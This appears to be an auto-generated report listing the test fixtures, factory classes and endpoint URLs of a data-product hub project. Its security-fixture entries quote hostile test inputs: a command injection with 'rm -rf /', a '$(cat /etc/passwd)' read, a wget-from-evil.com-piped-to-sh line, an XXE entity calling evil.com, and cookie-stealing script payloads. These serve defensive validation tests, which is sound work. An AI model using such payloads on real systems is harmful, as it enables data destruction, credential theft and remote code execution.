# Test Fixtures and Factories Report

**Generated:** 2025-12-28T14:25:14.497891

## Summary

- **Total Fixture Files:** 47
- **Total Factory Classes:** 43
- **Total Endpoint URLs Found:** 27
- **Factory Files:** 8

### Fixture Files by Type

- **json**: 42
- **conftest**: 5

## Fixture Files

### tests/fixtures/odps/v1.x/with_refs/sample-local-ref-v1.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-internal-ref-v1.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-internal-ref-v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-external-ref-v1.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v1.x/valid/sample-valid-v1.9.json
- **Type:** json
- **Size:** 491 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-v1.9`

### tests/fixtures/odps/security/malicious/path-traversal-attempt.json
- **Type:** json
- **Size:** 565 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/script-injection-attempt.json
- **Type:** json
- **Size:** 1187 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract?param=<script>alert(document.cookie)</script>`
  - `https://api.example.com/v1?callback=<script>eval('alert(1)')</script>`

### tests/fixtures/odps/security/malicious/path-traversal-multiple.json
- **Type:** json
- **Size:** 805 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/malicious-url-javascript.json
- **Type:** json
- **Size:** 815 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/xxe-attempt.json
- **Type:** json
- **Size:** 906 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>`

### tests/fixtures/odps/security/malicious/command-injection-attempt.json
- **Type:** json
- **Size:** 947 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract; rm -rf /`
  - `https://api.example.com/v1?param=$(cat /etc/passwd)`
  - `https://download.example.com/file; wget http://evil.com/steal.sh | sh`

### tests/fixtures/odps/v4.0/with_refs/sample-internal-ref-v4.0.json
- **Type:** json
- **Size:** 841 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-internal-ref-v4.0`

### tests/fixtures/odps/v4.0/with_refs/sample-external-ref-v4.0.json
- **Type:** json
- **Size:** 848 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-external-ref-v4.0`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.0/with_refs/sample-local-ref-v4.0.json
- **Type:** json
- **Size:** 721 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-local-ref-v4.0`

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json
- **Type:** json
- **Size:** 914 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-v4.0`
  - `https://api.example.com/v1/products/sample-product-v4.0`

### tests/fixtures/odps/v3.x/with_refs/sample-external-ref-v3.9.json
- **Type:** json
- **Size:** 813 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-external-ref-v3.9`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v3.x/with_refs/sample-internal-ref-v3.9.json
- **Type:** json
- **Size:** 806 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-internal-ref-v3.9`

### tests/fixtures/odps/v3.x/with_refs/sample-local-ref-v3.9.json
- **Type:** json
- **Size:** 714 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-local-ref-v3.9`

### tests/fixtures/odps/v3.x/valid/sample-valid-v3.9.json
- **Type:** json
- **Size:** 738 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-v3.9`

### tests/fixtures/odps/v2.x/with_refs/sample-internal-ref-v2.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-internal-ref-v2.9`

### tests/fixtures/odps/v2.x/with_refs/sample-external-ref-v2.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v2.x/with_refs/sample-local-ref-v2.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v2.9`

### tests/fixtures/odps/v2.x/valid/sample-valid-v2.9.json
- **Type:** json
- **Size:** 698 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-v2.9`

### tests/fixtures/odps/v4.1/marketplace/sample-payment-gateways-v4.1.json
- **Type:** json
- **Size:** 3186 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json
- **Type:** json
- **Size:** 1343 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/complete-marketplace-product`
  - `https://download.example.com/products/complete-marketplace-product`

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json
- **Type:** json
- **Size:** 3017 bytes
- **Endpoints Found:** 5
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/marketplace-access-product`
  - `https://docs.example.com/api/v1`
  - `https://download.example.com/products/marketplace-access-product`
  - `https://webhook.example.com/v1/products/marketplace-access-product`

### tests/fixtures/odps/v4.1/marketplace/sample-pricing-plans-v4.1.json
- **Type:** json
- **Size:** 3035 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-external-ref-v4.1.json
- **Type:** json
- **Size:** 923 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-external-ref-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-internal-ref-v4.1.json
- **Type:** json
- **Size:** 1269 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-internal-ref-v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-mixed-refs-v4.1.json
- **Type:** json
- **Size:** 953 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-mixed-refs-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-local-ref-v4.1.json
- **Type:** json
- **Size:** 796 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-local-ref-v4.1`

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json
- **Type:** json
- **Size:** 1763 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-multi`
  - `https://api.example.com/v1/products/multilingual-product-multi`

### tests/fixtures/odps/v4.1/multilingual/sample-french-only-v4.1.json
- **Type:** json
- **Size:** 674 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-fr`

### tests/fixtures/odps/v4.1/multilingual/sample-english-only-v4.1.json
- **Type:** json
- **Size:** 638 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-en`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-schema-v4.1.json
- **Type:** json
- **Size:** 287 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-schema-violation-v4.1.json
- **Type:** json
- **Size:** 328 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v3.9`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-details-v4.1.json
- **Type:** json
- **Size:** 184 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-missing-required-field-v4.1.json
- **Type:** json
- **Size:** 265 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-missing-product-v4.1.json
- **Type:** json
- **Size:** 164 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-product-v4.1.json
- **Type:** json
- **Size:** 135 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-version-pattern-v4.1.json
- **Type:** json
- **Size:** 346 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-schema-pattern-v4.1.json
- **Type:** json
- **Size:** 335 bytes
- **Endpoints Found:** 1
  - `https://invalid-schema-url.com/schema/v4.1`

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json
- **Type:** json
- **Size:** 1574 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-v4.1`
  - `https://api.example.com/v1/products/sample-product-v4.1`
  - `https://download.example.com/products/sample-product-v4.1`

### tests/conftest.py
- **Type:** conftest
- **Size:** 77968 bytes
- **Endpoints Found:** 4
  - `localhost:8083`
  - `localhost:8080`
  - `localhost:8081`
  - `localhost:8082`

### tests/e2e/conftest.py
- **Type:** conftest
- **Size:** 43566 bytes
- **Endpoints Found:** 10
  - `/api/v1/assets/assets/`
  - `/api/v1/compliance/compliance-runs/`
  - `/api/v1/contracts/contracts/`
  - `/api/v1/files/files/init/`
  - `/api/v1/dq/dq-runs/`
  - ... and 5 more

### tests/sdk_python/conftest.py
- **Type:** conftest
- **Size:** 17424 bytes
- **Endpoints Found:** 2
  - `/api/v1/auth/login/`
  - `localhost:8000`

### cli/tests/conftest.py
- **Type:** conftest
- **Size:** 2899 bytes

### cli/build/lib/tests/conftest.py
- **Type:** conftest
- **Size:** 2899 bytes

## Factory Classes

### tests/factories_boy.py

- **TenantFactory** (line 24)
  - Methods: 0

- **TenantConfigFactory** (line 38)
  - Methods: 0

- **UserFactory** (line 60)
  - Methods: 0

- **EmailDeliveryFactory** (line 74)
  - Methods: 0

- **JobFactory** (line 89)
  - Methods: 0

- **ScheduledIngestionFactory** (line 109)
  - Methods: 0

- **ScheduledIngestionRunFactory** (line 123)
  - Methods: 0

- **SchemaVersionFactory** (line 136)
  - Methods: 0

- **DataClassificationFactory** (line 154)
  - Methods: 0

- **RetentionPolicyFactory** (line 166)
  - Methods: 0

- **AccessRequestFactory** (line 178)
  - Methods: 0

- **DatasetSnapshotFactory** (line 191)
  - Methods: 0

- **SearchIndexFactory** (line 203)
  - Methods: 0

- **SearchAnalyticsFactory** (line 215)
  - Methods: 0

- **WebhookFactory** (line 227)
  - Methods: 0

- **WebhookDeliveryFactory** (line 240)
  - Methods: 0

- **DataObservabilityMetricFactory** (line 253)
  - Methods: 0

- **DataIncidentFactory** (line 266)
  - Methods: 0

- **AccessPolicyFactory** (line 280)
  - Methods: 0

- **FieldAccessPolicyFactory** (line 292)
  - Methods: 0

- **AccessLogFactory** (line 304)
  - Methods: 0

- **AccessCertificationFactory** (line 317)
  - Methods: 0

- **DQAnomalyFactory** (line 330)
  - Methods: 0

- **DQTrendFactory** (line 343)
  - Methods: 0

- **DQAlertingRuleFactory** (line 356)
  - Methods: 0

- **IngestionTemplateFactory** (line 369)
  - Methods: 0

- **DatasetFactoryEnhanced** (line 388)
  - Methods: 0

- **AssetFactoryEnhanced** (line 407)
  - Methods: 0

- **ContractFactoryEnhanced** (line 423)
  - Methods: 0

- **ScheduledIngestionFactoryEnhanced** (line 437)
  - Methods: 0

### tests/factories.py

- **UserFactory** (line 28)
  - Methods: 2
  - Method names: create_user, __call__

- **TenantFactory** (line 68)
  - Methods: 2
  - Method names: create_tenant, __call__

- **TenantConfigFactory** (line 117)
  - Methods: 2
  - Method names: create_tenant_config, create_tenant_config_with_all_fields

- **EmailDeliveryFactory** (line 205)
  - Methods: 3
  - Method names: create_email_delivery, create_email_delivery_with_all_statuses, create_email_delivery_with_all_types

- **JobFactory** (line 307)
  - Methods: 3
  - Method names: create_job, create_job_with_all_types, create_job_with_all_statuses

### hub/apps/versioning/tests/factories.py

- **DatasetVersionFactory** (line 20)
  - Methods: 1
  - Method names: create_dataset_version

- **SchemaVersionFactory** (line 73)
  - Methods: 1
  - Method names: create_schema_version

### hub/apps/assets/tests/factories.py

- **AssetFactory** (line 16)
  - Methods: 4
  - Method names: create_asset, create_active_asset, create_asset_with_all_statuses, __call__

### hub/apps/files/tests/factories.py

- **FileFactory** (line 17)
  - Methods: 3
  - Method names: create_file, create_file_with_all_statuses, create_large_file

### hub/apps/contracts/tests/factories.py

- **ContractFactoryEnhanced** (line 23)
  - Methods: 3
  - Method names: create_hub_contract_json, create_contract, create_contract_with_all_sections

### hub/apps/scheduled_ingestion/tests/factories.py

- **ScheduledIngestionFactory** (line 21)
  - Methods: 1
  - Method names: create_scheduled_ingestion

- **ScheduledIngestionRunFactory** (line 86)
  - Methods: 1
  - Method names: create_scheduled_ingestion_run

### hub/apps/datasets/tests/factories.py

- **DatasetFactory** (line 18)
  - Methods: 2
  - Method names: create_dataset, create_dataset_with_complex_schema

## Endpoint URLs in Fixtures

### tests/fixtures/odps/security/malicious/script-injection-attempt.json

- `api.example.com` (fixture)

### tests/fixtures/odps/security/malicious/command-injection-attempt.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json

- `api.example.com` (fixture)

### tests/conftest.py

- `localhost:8081` (fixture)
- `http://localhost:8080` (fixture)
- `localhost:8080` (fixture)
- `http://localhost:8083` (fixture)
- `localhost:8082` (fixture)
- `localhost:8083` (fixture)
- `http://localhost:8081` (fixture)
- `http://localhost:8082` (fixture)

### tests/e2e/conftest.py

- `/api/v1/assets/assets/` (fixture)
- `/api/v1/compliance/compliance-runs/` (fixture)
- `/api/v1/contracts/contracts/` (fixture)
- `/api/v1/files/files/init/` (fixture)
- `/api/v1/dq/dq-runs/` (fixture)
- `/api/v1/assets/assets/{asset_id}/activate/` (fixture)
- `/api/v1/files/files/{file_id}/complete/` (fixture)
- `/api/v1/datasets/datasets/` (fixture)
- `/api/v1/contracts/contracts/{contract_id}/validate/` (fixture)
- `/api/v1/assets/assets/{asset_id}/` (fixture)

### tests/sdk_python/conftest.py

- `/api/v1/auth/login/` (fixture)
- `localhost:8000` (fixture)

